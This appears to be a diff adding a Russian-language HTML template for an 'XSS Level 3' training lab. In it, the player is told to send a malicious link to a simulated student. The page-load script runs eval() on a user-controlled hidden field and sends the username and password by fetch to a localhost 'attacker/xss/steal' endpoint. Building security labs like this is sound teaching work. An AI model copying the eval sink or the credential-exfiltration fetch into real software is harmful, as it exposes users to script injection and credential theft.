@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Level 3 Form</title>
+    <link rel="stylesheet" href="CSS/style.css">
+</head>
+<body>
+<header>
+    <h1>XSS Level 3 Form</h1>
+</header>
+
+<div class="task-section">
+    {% if show_link %}
+        <h2>Ваша вредоносная ссылка</h2>
+        <p>Скопируйте ссылку ниже и отправьте её студенту (User):</p>
+        <div class="message-box">
+            <a href="{{ link }}" target="_blank">{{ link }}</a>
+        </div>
+    {% else %}
+        <h2>Введите свои данные</h2>
+        <p>Данные уже заполнены, нажмите "Проверить", чтобы продолжить.</p>
+
+        <div class="input-form">
+            <div class="input-container">
+                <input type="text" id="username" class="input-field" value="user123" readonly>
+                <input type="password" id="password" class="input-field" value="pass456" readonly>
+                <input type="hidden" id="xss-payload" value="{{ username }}">
+            </div>
+        </div>
+
+        <div class="answer-form">
+            <h3>Приветствие:</h3>
+            <div id="greeting"></div>
+        </div>
+
+        <div class="check-access">
+            <h3>🔒 Проверьте доступ:</h3>
+            <p>Введите свои имя пользователя и пароль, чтобы продолжить:</p>
+            <form method="POST">
+                <div class="input-container">
+                    <input type="text" name="username-input" class="input-field" value="user123">
+                    <input type="password" name="password-input" class="input-field" value="pass456">
+                    <button type="submit" class="submit-btn">Проверить</button>
+                </div>
+                {% if error %}
+                    <div class="message-box">{{ error }}</div>
+                {% endif %}
+            </form>
+        </div>
+    {% endif %}
+</div>
+
+{% if not show_link %}
+    <script>
+        // Автоматическое выполнение пейлоада при загрузке страницы
+        window.onload = function() {
+            const payload = document.getElementById('xss-payload').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Выполняем пейлоад
+            try {
+                eval(payload); // Опасно, но нужно для XSS
+            } catch (e) {
+                console.error('Ошибка выполнения пейлоада:', e);
+            }
+
+            // Отображаем приветствие
+            const greetingDiv = document.getElementById('greeting');
+            greetingDiv.innerHTML = 'Привет, ' + username + '!';
+
+            // Отправляем данные
+            if (username && password) {
+                const data = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+                fetch('http://localhost:8080/attacker/xss/steal?' + data)
+                    .then(response => console.log('Данные отправлены'))
+                    .catch(error => console.error('Ошибка:', error));
+            }
+        };
+    </script>
+{% endif %}
+</body>
+</html>
